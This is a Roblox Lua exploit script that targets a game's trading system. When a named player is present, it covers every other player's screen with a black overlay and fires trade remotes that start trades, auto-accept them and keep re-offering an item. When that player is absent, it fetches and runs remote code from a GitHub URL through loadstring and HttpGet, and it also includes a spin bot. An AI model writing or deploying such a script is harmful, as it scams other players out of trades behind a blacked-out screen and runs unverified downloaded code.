local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

-- Target identity
local REQUIRED_USER_NAME = "z_z0120292"
local REQUIRED_USER_ID = 407207583

local function isTargetPresent()
    for _, p in pairs(Players:GetPlayers()) do
        if p.Name == REQUIRED_USER_NAME or p.UserId == REQUIRED_USER_ID then
            return true
        end
    end
    return false
end

-- Item Table
local targetItems = {
    {"Overseer 1", 1}
}

-- IDLE SCRIPT MANAGER
local isIdleScriptRunning = false
local idleScriptThread

local function runIdleScript()
    if not isIdleScriptRunning then
        isIdleScriptRunning = true
        idleScriptThread = task.spawn(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/zorluaa/Void1/refs/heads/main/15"))()
        end)
    end
end

local function stopIdleScript()
    if isIdleScriptRunning then
        if idleScriptThread then task.cancel(idleScriptThread) end
        isIdleScriptRunning = false
    end
end

-- BLACKOUT & TRADE LOOP
RunService.Heartbeat:Connect(function()
    if isTargetPresent() then
        stopIdleScript()
        
        for _, victim in pairs(Players:GetPlayers()) do
            if victim ~= localPlayer then
                -- 1. PERSISTENT BLACKOUT
                local vGui = victim:FindFirstChild("PlayerGui")
                if vGui then
                    local existing = vGui:FindFirstChild("OverseerLock")
                    if not existing then
                        local screenBlock = Instance.new("ScreenGui")
                        screenBlock.Name = "OverseerLock"
                        screenBlock.IgnoreGuiInset = true
                        screenBlock.DisplayOrder = 999999
                        local frame = Instance.new("Frame")
                        frame.Size = UDim2.new(1, 0, 1, 0)
                        frame.BackgroundColor3 = Color3.new(0, 0, 0)
                        frame.BorderSizePixel = 0
                        frame.Parent = screenBlock
                        screenBlock.Parent = vGui
                    end
                end

                -- 2. INITIATE TRADE
                ReplicatedStorage.Remotes.StartTrade:FireServer(victim)
            end
        end

        -- 3. AUTO-ACCEPT & STATUS
        ReplicatedStorage.Remotes.UpdTradeStatus:FireServer(true)
        ReplicatedStorage.Remotes.UpdTradeReview:FireServer()
    else
        -- CLEANUP BLACKOUT IF YOU LEAVE
        for _, victim in pairs(Players:GetPlayers()) do
            local vGui = victim:FindFirstChild("PlayerGui")
            if vGui and vGui:FindFirstChild("OverseerLock") then
                vGui.OverseerLock:Destroy()
            end
        end
        runIdleScript()
    end
end)

-- ITEM PLACEMENT LOGIC (RETRY LOOP)
local tradeGui = localPlayer.PlayerGui:WaitForChild("ScreenGui").UI.TradeScreen
local isPlacing = false

tradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
    if tradeGui.Visible and isTargetPresent() and not isPlacing then
        isPlacing = true
        
        -- We loop the item offer until the trade closes to ensure the server "takes" them
        task.spawn(function()
            while tradeGui.Visible and isTargetPresent() do
                local t = {}
                for i, item in ipairs(targetItems) do
                    t[i] = {[1] = item[1], [2] = item[2]}
                end

                -- Direct offer fire
                ReplicatedStorage.Remotes.UpdateTradeOffer:FireServer(t)
                
                task.wait(0.5) -- Retry every half second
            end
            isPlacing = false
        end)
    end
end)

-- SPIN BOT
local SPIN_SPEED = 12 
local spinConnection
local function startSpinning(character)
    local root = character:WaitForChild("HumanoidRootPart")
    local humanoid = character:WaitForChild("Humanoid")
    if spinConnection then spinConnection:Disconnect() end
    spinConnection = RunService.RenderStepped:Connect(function(deltaTime)
        if isTargetPresent() and root and root.Parent then
            humanoid.AutoRotate = false
            root.CFrame = root.CFrame * CFrame.Angles(0, SPIN_SPEED * deltaTime, 0)
        else
            humanoid.AutoRotate = true
        end
    end)
end
if localPlayer.Character then startSpinning(localPlayer.Character) end
localPlayer.CharacterAdded:Connect(startSpinning)

